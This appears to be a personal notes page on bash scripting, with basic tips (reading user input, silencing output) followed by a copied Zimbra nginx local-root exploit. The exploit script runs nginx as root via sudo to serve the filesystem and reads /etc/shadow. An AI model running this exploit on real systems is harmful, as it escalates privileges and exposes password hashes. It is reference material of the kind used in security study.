# S c r i p t i n g

- _"A script should be run without errors"_
- _"It should perform the task for which it is intended"_
- _"Program logic is clearly defined and apparent"_
- _"A script does not do unnecessary work"_


Scripts should be reusable

## Waiting for user input
````powershell
read -p "Write the path: " variableName
read -p "Press [ENTER] when finished..."
````

## Redirecting output
Code
````powershell
sudo apt update > /dev/null 2>&1 

````

## zimbra-nginx-local-root-exploit
- [Source](https://darrenmartyn.ie/2021/10/25/zimbra-nginx-local-root-exploit/)
````
#!/bin/bash
echo "[+] making config"
cat <<EOF >/tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
    listen 1337;
    root /;
    autoindex on;
}
}
EOF
echo "[+] Launching..."
sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf
echo "[+] Reading /etc/shadow..."
curl http://localhost:1337/etc/shadow
````
